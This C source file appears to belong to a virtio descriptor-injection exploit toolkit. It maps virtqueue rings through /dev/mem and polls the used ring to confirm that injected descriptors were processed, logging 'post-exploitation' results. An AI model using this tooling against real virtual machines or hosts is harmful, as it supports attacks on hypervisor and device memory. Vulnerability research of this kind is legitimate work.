#define _POSIX_C_SOURCE 199309L

#include "descriptor_tracking.h"
#include "buffer_management.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <time.h>
static void sleep_ms(int ms){ if(ms<=0)return; struct timespec ts={.tv_sec=ms/1000,.tv_nsec=(long)(ms%1000)*1000000L}; nanosleep(&ts,NULL);}
static void sleep_us(long us){ if(us<=0)return; struct timespec ts={.tv_sec=us/1000000L,.tv_nsec=(long)(us%1000000L)*1000L}; nanosleep(&ts,NULL);}
#include <errno.h>

#define MAX_TRACKED_DESCRIPTORS 16

static struct descriptor_state tracked_descriptors[MAX_TRACKED_DESCRIPTORS];
static int num_tracked = 0;

static void get_current_time(struct timespec *ts) {
    clock_gettime(CLOCK_MONOTONIC, ts);
}

static double time_diff_ms(struct timespec *start, struct timespec *end) {
    return (end->tv_sec - start->tv_sec) * 1000.0 +
           (end->tv_nsec - start->tv_nsec) / 1000000.0;
}

static void dump_used_ring(struct virtq_used *used, int queue_size, const char *context) {
    printf("\n=== USED RING DUMP (%s) ===\n", context);
    printf("used->flags: 0x%04x\n", used->flags);
    printf("used->idx:   %u\n", used->idx);
    
    // Show last 10 used entries (or fewer if idx is small)
    int start = (used->idx >= 10) ? used->idx - 10 : 0;
    printf("Recent used ring entries (showing from %d to %d):\n", start, used->idx - 1);
    
    for (int i = start; i < used->idx && i < start + 10; i++) {
        struct virtq_used_elem *elem = &used->ring[i % queue_size];
        printf("  used[%d]: id=%u len=%u", i, elem->id, elem->len);
        
        // Check if this matches any of our tracked descriptors
        for (int j = 0; j < num_tracked; j++) {
            if (tracked_descriptors[j].desc_index == elem->id) {
                printf(" *** MATCHES TRACKED DESCRIPTOR %d ***", j);
                tracked_descriptors[j].is_processed = 1;
                break;
            }
        }
        printf("\n");
    }
}

static int analyze_used_ring_for_injection(uintptr_t virtqueue_addr) {
    printf("\n=== ANALYZING USED RING FOR INJECTED DESCRIPTORS ===\n");
    
    int mem_fd = open("/dev/mem", O_RDWR);
    if (mem_fd < 0) {
        printf("Cannot access /dev/mem: %s\n", strerror(errno));
        return 0;
    }

    size_t page_size = 4096;
    uintptr_t page_addr = virtqueue_addr & ~(page_size - 1);
    void *vq_mem = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, page_addr);

    if (vq_mem == MAP_FAILED) {
        printf("Failed to map virtqueue: %s\n", strerror(errno));
        close(mem_fd);
        return 0;
    }

    size_t desc_offset = virtqueue_addr & (page_size - 1);
    struct virtq_desc *desc_table = (struct virtq_desc*)((char*)vq_mem + desc_offset);
    
    int queue_size = 256;
    struct virtq_avail *avail = (struct virtq_avail*)(desc_table + queue_size);
    struct virtq_used *used = (struct virtq_used*)((char*)avail + sizeof(struct virtq_avail) +
                                                   queue_size * sizeof(uint16_t));

    dump_used_ring(used, queue_size, "POST-EXPLOITATION");
    
    int found_processed = 0;
    
    // Check if any of our tracked descriptors appear in the used ring
    for (int i = 0; i < num_tracked; i++) {
        struct descriptor_state *state = &tracked_descriptors[i];
        printf("\nSearching for tracked descriptor %d (index %u) in used ring...\n", 
               i, state->desc_index);
        
        // Search through recent used entries
        int search_range = (used->idx >= 50) ? 50 : used->idx;
        int start_search = used->idx - search_range;
        if (start_search < 0) start_search = 0;
        
        for (int j = start_search; j < used->idx; j++) {
            struct virtq_used_elem *elem = &used->ring[j % queue_size];
            if (elem->id == state->desc_index) {
                printf("  FOUND! Descriptor %u processed at used[%d]\n", state->desc_index, j);
                printf("  Bytes transferred: %u\n", elem->len);
                printf("  Expected length: %u\n", state->len);
                
                if (elem->len != state->len) {
                    printf("  *** LENGTH MISMATCH: Device processed %u bytes, expected %u ***\n",
                           elem->len, state->len);
                }
                
                state->is_processed = 1;
                state->is_completed = 1;
                found_processed++;
                break;
            }
        }
        
        if (!state->is_processed) {
            printf("  Descriptor %u not found in recent used entries\n", state->desc_index);
        }
    }
    
    munmap(vq_mem, page_size);
    close(mem_fd);
    
    return found_processed;
}

int track_descriptor_injection(uintptr_t virtqueue_addr, uint16_t desc_index,
                              struct virtq_desc *desc) {
    printf("\n=== TRACKING DESCRIPTOR INJECTION ===\n");

    if (num_tracked >= MAX_TRACKED_DESCRIPTORS) {
        printf("Maximum tracked descriptors reached (%d)\n", MAX_TRACKED_DESCRIPTORS);
        return -1;
    }

    int mem_fd = open("/dev/mem", O_RDWR);
    if (mem_fd < 0) {
        printf("Cannot access /dev/mem for tracking: %s\n", strerror(errno));
        return -1;
    }

    size_t page_size = 4096;
    uintptr_t page_addr = virtqueue_addr & ~(page_size - 1);
    void *vq_mem = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, page_addr);

    if (vq_mem == MAP_FAILED) {
        printf("Failed to map virtqueue for tracking: %s\n", strerror(errno));
        close(mem_fd);
        return -1;
    }

    size_t desc_offset = virtqueue_addr & (page_size - 1);
    struct virtq_desc *desc_table = (struct virtq_desc*)((char*)vq_mem + desc_offset);

    int queue_size = 256;
    struct virtq_avail *avail = (struct virtq_avail*)(desc_table + queue_size);
    struct virtq_used *used = (struct virtq_used*)((char*)avail + sizeof(struct virtq_avail) +
                                                   queue_size * sizeof(uint16_t));

    // Initialize tracking state
    struct descriptor_state *state = &tracked_descriptors[num_tracked++];
    memset(state, 0, sizeof(*state));

    state->desc_index = desc_index;
    state->addr = desc->addr;
    state->len = desc->len;
    state->flags = desc->flags;

    get_current_time(&state->injection_time);
    state->last_check_time = state->injection_time;

    state->initial_avail_idx = avail->idx;
    state->initial_used_idx = used->idx;
    state->current_used_idx = used->idx;

    state->is_injected = 1;
    state->is_processed = 0;
    state->is_completed = 0;

    printf("Tracking descriptor %u:\n", desc_index);
    printf("  addr:            0x%016lx\n", state->addr);
    printf("  len:             %u bytes\n", state->len);
    printf("  flags:           0x%04x\n", state->flags);
    printf("  initial_avail:   %u\n", state->initial_avail_idx);
    printf("  initial_used:    %u\n", state->initial_used_idx);

    // Dump used ring state before injection
    dump_used_ring(used, queue_size, "PRE-INJECTION");

    munmap(vq_mem, page_size);
    close(mem_fd);

    return num_tracked - 1;
}

int check_descriptor_processing(uintptr_t virtqueue_addr, int timeout_ms) {
    printf("\n=== CHECKING DESCRIPTOR PROCESSING ===\n");

    if (num_tracked == 0) {
        printf("No descriptors being tracked\n");
        return -1;
    }

    int mem_fd = open("/dev/mem", O_RDWR);
    if (mem_fd < 0) {
        printf("Cannot access /dev/mem for checking: %s\n", strerror(errno));
        return -1;
    }

    size_t page_size = 4096;
    uintptr_t page_addr = virtqueue_addr & ~(page_size - 1);
    void *vq_mem = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, page_addr);

    if (vq_mem == MAP_FAILED) {
        printf("Failed to map virtqueue for checking: %s\n", strerror(errno));
        close(mem_fd);
        return -1;
    }

    size_t desc_offset = virtqueue_addr & (page_size - 1);
    struct virtq_desc *desc_table = (struct virtq_desc*)((char*)vq_mem + desc_offset);

    int queue_size = 256;
    struct virtq_avail *avail = (struct virtq_avail*)(desc_table + queue_size);
    struct virtq_used *used = (struct virtq_used*)((char*)avail + sizeof(struct virtq_avail) +
                                                   queue_size * sizeof(uint16_t));

    struct timespec start_time, current_time;
    get_current_time(&start_time);

    printf("Monitoring descriptor processing (timeout: %d ms)...\n", timeout_ms);
    uint16_t initial_used_idx = used->idx;
    printf("Initial used->idx: %u\n", initial_used_idx);

    while (1) {
        get_current_time(&current_time);
        double elapsed_ms = time_diff_ms(&start_time, &current_time);

        if (elapsed_ms > timeout_ms) {
            printf("Timeout reached after %.2f ms\n", elapsed_ms);
            break;
        }

        uint16_t current_used_idx = used->idx;

        if (current_used_idx != initial_used_idx) {
            printf("USED RING ACTIVITY DETECTED!\n");
            printf("  used->idx changed: %u -> %u (elapsed: %.2f ms)\n", 
                   initial_used_idx, current_used_idx, elapsed_ms);
            
            // Analyze newly processed descriptors
            for (uint16_t i = initial_used_idx; i < current_used_idx; i++) {
                struct virtq_used_elem *elem = &used->ring[i % queue_size];
                printf("  New used[%u]: id=%u len=%u\n", i, elem->id, elem->len);
                
                // Check against our tracked descriptors
                for (int j = 0; j < num_tracked; j++) {
                    struct descriptor_state *state = &tracked_descriptors[j];
                    if (state->desc_index == elem->id) {
                        printf("  *** TRACKED DESCRIPTOR %d PROCESSED! ***\n", j);
                        printf("  *** Length processed: %u bytes ***\n", elem->len);
                        state->is_processed = 1;
                        state->is_completed = 1;
                        state->current_used_idx = current_used_idx;
                        
                        munmap(vq_mem, page_size);
                        close(mem_fd);
                        return 1; // Success!
                    }
                }
            }
            
            initial_used_idx = current_used_idx;
        }

        sleep_ms(1);
    }

    // Final analysis even if no activity detected during monitoring
    int found = analyze_used_ring_for_injection(virtqueue_addr);

    munmap(vq_mem, page_size);
    close(mem_fd);
    return found;
}

void monitor_used_ring_changes(uintptr_t virtqueue_addr, int duration_ms) {
    printf("\n=== MONITORING USED RING CHANGES ===\n");

    int mem_fd = open("/dev/mem", O_RDWR);
    if (mem_fd < 0) {
        printf("Cannot access /dev/mem for monitoring: %s\n", strerror(errno));
        return;
    }

    size_t page_size = 4096;
    uintptr_t page_addr = virtqueue_addr & ~(page_size - 1);
    void *vq_mem = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, page_addr);

    if (vq_mem == MAP_FAILED) {
        printf("Failed to map virtqueue for monitoring: %s\n", strerror(errno));
        close(mem_fd);
        return;
    }

    size_t desc_offset = virtqueue_addr & (page_size - 1);
    struct virtq_desc *desc_table = (struct virtq_desc*)((char*)vq_mem + desc_offset);

    int queue_size = 256;
    struct virtq_avail *avail = (struct virtq_avail*)(desc_table + queue_size);
    struct virtq_used *used = (struct virtq_used*)((char*)avail + sizeof(struct virtq_avail) +
                                                   queue_size * sizeof(uint16_t));

    struct timespec start_time, current_time;
    get_current_time(&start_time);

    uint16_t prev_used_idx = used->idx;
    uint16_t prev_avail_idx = avail->idx;

    printf("Starting monitoring (duration: %d ms)\n", duration_ms);
    printf("Initial avail->idx: %u, used->idx: %u\n", prev_avail_idx, prev_used_idx);

    while (1) {
        get_current_time(&current_time);
        double elapsed_ms = time_diff_ms(&start_time, &current_time);

        if (elapsed_ms > duration_ms) {
            break;
        }

        uint16_t current_avail_idx = avail->idx;
        uint16_t current_used_idx = used->idx;

        if (current_avail_idx != prev_avail_idx) {
            printf("[%.2f ms] avail->idx: %u -> %u (new descriptors available)\n",
                   elapsed_ms, prev_avail_idx, current_avail_idx);
            prev_avail_idx = current_avail_idx;
        }

        if (current_used_idx != prev_used_idx) {
            printf("[%.2f ms] used->idx: %u -> %u (descriptors processed)\n",
                   elapsed_ms, prev_used_idx, current_used_idx);

            for (uint16_t i = prev_used_idx; i < current_used_idx; i++) {
                struct virtq_used_elem *elem = &used->ring[i % queue_size];
                printf("  Processed descriptor %u, length: %u bytes", elem->id, elem->len);
                
                // Check if this is one of our tracked descriptors
                for (int j = 0; j < num_tracked; j++) {
                    if (tracked_descriptors[j].desc_index == elem->id) {
                        printf(" *** OUR INJECTED DESCRIPTOR! ***");
                        tracked_descriptors[j].is_processed = 1;
                        tracked_descriptors[j].is_completed = 1;
                        break;
                    }
                }
                printf("\n");
            }

            prev_used_idx = current_used_idx;
        }

        sleep_us(500);
    }

    printf("Monitoring complete after %.2f ms\n", time_diff_ms(&start_time, &current_time));

    // Final used ring analysis
    analyze_used_ring_for_injection(virtqueue_addr);

    munmap(vq_mem, page_size);
    close(mem_fd);
}

void dump_descriptor_state(void) {
    printf("\n=== DESCRIPTOR TRACKING STATE ===\n");

    if (num_tracked == 0) {
        printf("No descriptors currently tracked\n");
        return;
    }

    struct timespec current_time;
    get_current_time(&current_time);

    printf("Total tracked descriptors: %d\n\n", num_tracked);

    int processed_count = 0;
    for (int i = 0; i < num_tracked; i++) {
        struct descriptor_state *state = &tracked_descriptors[i];
        double age_ms = time_diff_ms(&state->injection_time, &current_time);
        double last_check_ms = time_diff_ms(&state->last_check_time, &current_time);

        printf("Descriptor %d:\n", i);
        printf("  Index:           %u\n", state->desc_index);
        printf("  Address:         0x%016lx\n", state->addr);
        printf("  Length:          %u bytes\n", state->len);
        printf("  Flags:           0x%04x\n", state->flags);
        printf("  Age:             %.2f ms\n", age_ms);
        printf("  Last check:      %.2f ms ago\n", last_check_ms);
        printf("  Status:          %s%s%s\n",
               state->is_injected ? "INJECTED " : "",
               state->is_processed ? "PROCESSED " : "",
               state->is_completed ? "COMPLETED" : "PENDING");
        printf("  Used idx:        %u -> %u\n", state->initial_used_idx, state->current_used_idx);
        
        if (state->is_processed) {
            processed_count++;
            printf("  *** DEVICE PROCESSED THIS DESCRIPTOR ***\n");
        }
        printf("\n");
    }
    
    printf("SUMMARY: %d/%d tracked descriptors were processed by the device\n", 
           processed_count, num_tracked);
}
